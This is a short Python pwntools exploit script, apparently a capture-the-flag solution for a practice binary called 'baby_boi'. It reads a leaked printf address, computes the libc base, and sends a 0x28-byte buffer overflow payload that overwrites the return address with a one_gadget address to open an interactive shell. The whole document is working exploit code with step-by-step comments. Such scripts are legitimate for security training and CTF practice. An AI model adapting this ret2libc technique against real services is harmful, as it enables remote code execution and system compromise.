from pwn import *

# Step 1: Start the process
# We preload the given libc so our local test matches remote
target = process('./baby_boi', env={"LD_PRELOAD": "./libc-2.27.so"})

# Load the libc file to get symbol offsets
libc = ELF('libc-2.27.so')

# Step 2: Receive the infoleak
print(target.recvuntil(b"Here I am: "))
leak_line = target.recvline().strip()
printf_addr = int(leak_line, 16)

print(f"[+] Leaked printf address: {hex(printf_addr)}")

# Step 3: Calculate libc base
libc_base = printf_addr - libc.symbols['printf']
print(f"[+] libc base: {hex(libc_base)}")

# Step 4: Compute address of one-gadget
# Using 0x4f322 — the one with [rsp+0x40] == NULL
one_gadget = libc_base + 0x4f322
print(f"[+] One-gadget address: {hex(one_gadget)}")

# Step 5: Build payload
payload = b"A" * 0x28          # 32 (buf) + 8 (saved RBP)
payload += p64(one_gadget)     # Overwrite return address

# Step 6: Send it
target.sendline(payload)

# Step 7: Enjoy shell!
target.interactive()
